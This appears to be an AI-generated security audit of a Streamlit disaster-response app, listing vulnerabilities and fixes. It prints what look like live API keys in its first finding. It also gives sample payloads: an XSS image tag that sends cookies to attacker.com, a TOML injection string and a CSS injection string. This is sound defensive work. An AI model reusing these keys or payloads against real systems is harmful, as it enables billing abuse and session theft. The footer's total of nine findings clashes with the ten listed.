# SECURITY AUDIT: ASTRO-RESQ Codebase
> Generated: 2026-03-29 | Auditor: Claude Sonnet 4.6 | Mindset: Adversarial

**Risk Assessment: HIGH**
4 exploitable attack surfaces, 2 critical credential exposures, multiple XSS vectors across all tabs.

---

## Findings

---

### [CRITICAL] Exposed API Keys in Plaintext Config File

- **Severity:** Critical
- **Location:** `.streamlit/secrets.toml` lines 5, 8, 11, 14
- **The Exploit:**
  Any process or user with read access to the filesystem — or any accidental `git add .` — exposes all four service keys simultaneously:
  ```
  PLAKa3a4719695b045a1b2797a0dd66494f1          ← Planet Labs (paid satellite imagery)
  sk-ant-api03-76DpCUMPkR1SH2LqN59Y7U...        ← Anthropic Claude (billing abuse)
  b7917f698a363303c3bbdca681a6e4f0               ← OpenWeatherMap
  AIzaSyCulmL6IDkFpHaB-GTMToz7l0ERFjRP5Hk       ← Google Gemini (free tier exhaustion)
  ```
  An attacker who gains access to the repo, a screenshot, or the deployment environment gets immediate, uncapped access to all paid APIs.
- **The Fix:**
  1. **Rotate all four keys immediately** via their respective consoles.
  2. Add `.streamlit/secrets.toml` to `.gitignore` (Streamlit Cloud auto-injects secrets securely).
  3. For local dev, keep secrets.toml but never commit it.

---

### [CRITICAL] User-Supplied API Key Written to Disk as Plaintext

- **Severity:** Critical
- **Location:** `main.py` lines 318–329
- **The Exploit:**
  The app accepts a Planet API key via text input and writes it unescaped into `secrets.toml`:
  ```python
  _new = _re.sub(
      r'(api_key\s*=\s*)"[^"]*"',
      f'api_key = "{planet_api_key}"',   # raw user input
      _content,
  )
  _secrets_path.write_text(_new)
  ```
  **Attack 1 — TOML Injection:** A user inputs `evil" \n[evil]\nkey = "pwned` to inject arbitrary TOML sections, potentially overwriting other credentials in the file.
  **Attack 2 — Path Traversal prerequisite:** Once an attacker controls the file write, other keys in the same file are clobberable.
- **The Fix:**
  ```python
  import re
  # Validate key format before writing (Planet keys: PL-AK... or PLAK...)
  if not re.fullmatch(r'[A-Za-z0-9\-_]{20,60}', planet_api_key):
      st.error("Geçersiz API key formatı.")
      st.stop()
  # Then use toml library to write, never string interpolation:
  import toml
  config = toml.load(str(_secrets_path))
  config["planet"]["api_key"] = planet_api_key
  _secrets_path.write_text(toml.dumps(config))
  ```

---

### [HIGH] XSS — External API Data Rendered Unescaped into HTML

- **Severity:** High
- **Location:** `main.py` — multiple locations:
  - Lines 745–751 (seismic source name, status, timestamp)
  - Lines 763–770 (earthquake location string `_loc`, time-ago `_ago`)
  - Lines 428–433 (weather decision text `_wd.decision_text`)
  - Lines 1156, 1189, 1203, 1210 (AI report fields: `_item`, `_bolge`, `_aciklama`, `_krt['oncelikli']`, `_r['ozet']`)
- **The Exploit:**
  All of these follow this pattern:
  ```python
  st.markdown(f"<div>{external_api_value}</div>", unsafe_allow_html=True)
  ```
  If any upstream API (AFAD, Kandilli, USGS, OpenWeatherMap) is compromised or returns a crafted response containing:
  ```html
  <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
  ```
  ...the script executes in the victim's browser. In Streamlit Cloud, this affects every concurrent user.

  **Realistic threat:** USGS/AFAD APIs are public and could be MITM'd on an unsecured connection. The `_loc` field from USGS earthquakes has been historically used for OSINT; a poisoned entry executes JS.

- **The Fix:**
  ```python
  import html

  # Wrap every external value before HTML interpolation:
  safe_loc = html.escape(str(_ev.location))
  st.markdown(f"<span>{safe_loc}</span>", unsafe_allow_html=True)
  ```
  For color/style variables derived from data, validate they're valid hex colors:
  ```python
  import re
  def safe_color(c: str) -> str:
      return c if re.fullmatch(r'#[0-9A-Fa-f]{3,8}', c) else '#adb5bd'
  ```

---

### [HIGH] CSS Injection via Color Variables from External Data

- **Severity:** High
- **Location:** `main.py` lines 630, 635, 650, 752, 861, 1137, 1140
- **The Exploit:**
  Color values like `_sev_color`, `_clr`, `_ws_border` are interpolated directly into `style="color:{_clr}"`. CSS injection payload example:
  ```
  color: red; } body { display:none; } .x { color: red
  ```
  More dangerous: CSS `expression()` (IE), `url()` with data URIs for exfiltration in some Chromium contexts, or simple defacement.
  The values come from dict lookups like `STATUS_COLOR.get(status, "#adb5bd")` — safe if the dict is hardcoded, but if `status` from an API response is passed to `get()` with a fallback, a crafted status string that matches no key returns `"#adb5bd"` (safe). **However**, any place where colors are computed from external magnitude/score values has no such guard.
- **The Fix:**
  ```python
  _SAFE_COLORS = {"KRİTİK": "#e63946", "YÜKSEK": "#f77f00", "ORTA": "#fcbf49", "DÜŞÜK": "#06d6a0"}
  _sev_color = _SAFE_COLORS.get(str(_r.get("hasar_seviyesi", "")), "#adb5bd")
  # Never interpolate a color computed from float math directly into style attr
  ```

---

### [HIGH] Attribute Error Crash — `self.blocked_edges` Undefined

- **Severity:** High (availability / reliability)
- **Location:** `routing_engine.py` line ~590
- **The Exploit:**
  `self.blocked_edges.add((u, v, k))` is called but `self.blocked_edges` is never initialized in `__init__` (only `self.damaged_edges = set()` exists at line ~49). This raises an unhandled `AttributeError` at runtime, crashing the routing engine silently or exposing a traceback in the UI. An attacker who knows this can trigger it on demand (e.g., by submitting a route request that reaches this code path) to deny service.
- **The Fix:**
  ```python
  # In __init__:
  self.damaged_edges: set = set()
  self.blocked_edges: set = set()   # add this line
  ```

---

### [MEDIUM] Full Exception Messages Exposed to Users

- **Severity:** Medium
- **Location:** `main.py` lines 193, 408, 1295, 1335, 2112
  ```python
  st.error(f"GeoTIFF hatası: {e}")         # line 193
  st.error(f"Hava durumu API hatası: {_we}") # line 408
  st.error(f"Görüntü çekme hatası: {_img_err}") # line 1295
  ```
- **The Exploit:**
  Python exception strings routinely contain: file paths (`/Users/eren/Desktop/yangın/...`), internal function names, library versions, network addresses, and partial credentials. An attacker-induced error (e.g., by providing invalid coordinates) forces the app to reveal its internal structure.
- **The Fix:**
  ```python
  import logging
  logger = logging.getLogger(__name__)

  try:
      ...
  except Exception as e:
      logger.exception("GeoTIFF işleme hatası")          # full trace to server logs
      st.error("Görüntü işlenirken bir hata oluştu.")    # sanitized message to UI
  ```

---

### [MEDIUM] HTTP (Unencrypted) Call to OSRM Routing Service

- **Severity:** Medium
- **Location:** `main.py` lines 1709–1710
  ```python
  _osrm_url = "http://router.project-osrm.org/route/v1/driving/"
  ```
- **The Exploit:**
  On any network where traffic can be intercepted (conference WiFi, hotel network, demo environment), an attacker performing MITM can:
  1. Inject malicious route geometry that causes routing to show wrong paths.
  2. Intercept the coordinates being queried (revealing user location/target area).
  The OSRM demo server supports HTTPS.
- **The Fix:**
  ```python
  _osrm_url = "https://router.project-osrm.org/route/v1/driving/"
  ```

---

### [MEDIUM] Regex-Based XML Parsing (CEMS WFS Response)

- **Severity:** Medium
- **Location:** `cems_service.py` lines 312–313
  ```python
  found = re.findall(
      rf'<(?:wfs:)?Name>({re.escape(emsr_code)}_[^<]+)</(?:wfs:)?Name>',
      caps_text,
  )
  ```
- **The Exploit:**
  XML-with-regex is fragile against malformed or adversarially crafted responses. A Copernicus WFS response containing CDATA sections, namespace variations, or embedded comments can bypass the regex while `[^<]+` prevents tag injection, carefully crafted whitespace or encoding can still cause incorrect extraction. If the mock fallback is ever replaced with live data, this becomes an active attack surface.
- **The Fix:**
  ```python
  import xml.etree.ElementTree as ET
  root = ET.fromstring(caps_text)
  ns = {'wfs': 'http://www.opengis.net/wfs/2.0'}
  names = [el.text for el in root.findall('.//wfs:Name', ns)
           if el.text and el.text.startswith(emsr_code)]
  ```

---

### [LOW] Missing `.gitignore` for Secrets File

- **Severity:** Low (preventive)
- **Location:** Project root
- **The Exploit:** No `.gitignore` entry for `.streamlit/secrets.toml` means a `git add .` or GitHub Desktop auto-stage will commit all four API keys to version history. Once in git history, rotation is not sufficient — the key lives in every clone forever.
- **The Fix:**
  ```
  # .gitignore
  .streamlit/secrets.toml
  *.toml
  .env
  __pycache__/
  *.pyc
  .venv/
  ```

---

### [LOW] `random` Module Used for Security-Adjacent Simulation

- **Severity:** Low
- **Location:** `routing_engine.py` — `random.seed(42)` used for road damage simulation
- **The Exploit:** Not cryptographic. The seed is hardcoded (42), meaning the damage pattern is 100% deterministic and predictable. For a demo this is fine, but if this code ever feeds real operational decisions, predictable randomness = bypassed risk modeling.
- **The Fix:** For demo: document it clearly. For production: use `secrets` module or real sensor data.

---

## Observations (Hardening)

- **Content Security Policy:** Streamlit does not set a restrictive CSP by default. Combined with `unsafe_allow_html=True`, this maximizes XSS blast radius. Consider reverse-proxying with nginx and adding `Content-Security-Policy: default-src 'self'` headers.
- **Rate Limiting:** No rate limiting on the "Uydudan Çek & Analiz Et" button or 112 notification submission. A malicious user can spam satellite image fetches (ArcGIS bandwidth abuse) or flood the 112 notification log.
- **Input Coordinate Validation:** Latitude/longitude inputs in the image analysis tab accept arbitrary floats. Passing coordinates outside [-90,90] / [-180,180] will send malformed requests to ArcGIS and return useless results silently.
  ```python
  if not (-90 <= _img_lat <= 90) or not (-180 <= _img_lon <= 180):
      st.error("Geçersiz koordinat.")
      st.stop()
  ```
- **Dependency Pinning:** `requirements.txt` should pin exact versions. Unpinned dependencies (`requests`, `folium`, `osmnx`) can introduce vulnerabilities on silent upgrades.

---

## Priority Remediation Order

| Priority | Action | Time |
|----------|--------|------|
| 1 | Rotate all 4 API keys (Planet, Anthropic, OpenWeather, Gemini) | 10 min |
| 2 | Add `.streamlit/secrets.toml` to `.gitignore` | 2 min |
| 3 | Wrap all external API values with `html.escape()` before `unsafe_allow_html` | 30 min |
| 4 | Fix `self.blocked_edges` initialization in `routing_engine.py` | 2 min |
| 5 | Fix TOML injection in Planet key write with `toml` library | 15 min |
| 6 | Replace HTTP OSRM URL with HTTPS | 1 min |
| 7 | Sanitize error messages shown to users | 20 min |
| 8 | Add coordinate input validation | 10 min |

---

*End of report. Total findings: 9 | Critical: 2 | High: 3 | Medium: 3 | Low: 2*
